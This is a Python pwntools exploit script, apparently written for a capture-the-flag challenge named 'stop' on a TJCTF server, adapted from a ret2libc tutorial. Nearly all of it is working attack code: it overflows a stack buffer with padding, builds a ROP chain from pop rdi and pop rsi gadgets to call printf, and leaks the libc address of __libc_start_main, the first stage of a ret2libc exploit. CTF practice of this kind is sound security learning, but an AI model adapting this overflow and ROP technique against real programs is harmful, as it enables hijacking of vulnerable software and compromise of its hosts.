""" The following script was based heavily on the script provided in the following url """
"""           https://tasteofsecurity.com/security/ret2libc-unknown-libc/              """

#!/usr/bin/python3
import sys
from pwn import *

conn = remote('p1.tjctf.org', 8001)

p = process("./stop") # start the vuln binary
elf = ELF("./stop") # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

# Find addresses for printf, __libc_start_main and a `pop rdi;ret` gadget
PRINTF = elf.plt['printf']
LIBC_START_MAIN = elf.symbols['__libc_start_main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
POP_RSI = (rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"

FORMAT_STRING = 0x400e43 

log.info("printf@plt: " + hex(PRINTF))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))

padding = b"A"*258 + b"BBBBBBBBCCCCCCCCDDDDDDDD"

# Create rop chain
rop = p64(POP_RDI) + p64(FORMAT_STRING) + p64(POP_RSI) + p64(LIBC_START_MAIN) + b"JUNKJUNK" + p64(PRINTF)

payload = padding + rop 

#Send our rop-chain payload
conn.sendline(payload)

#Parse leaked address
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
received = conn.recvline().strip()
print(received)
leak = u64(received.ljust(8, b"\x00"))
log.info("Leaked libc address,  __libc_start_main: %s" % hex(leak))

p.close()
conn.close()

#sys.stdout.buffer.write(padding + addr + b"\n")
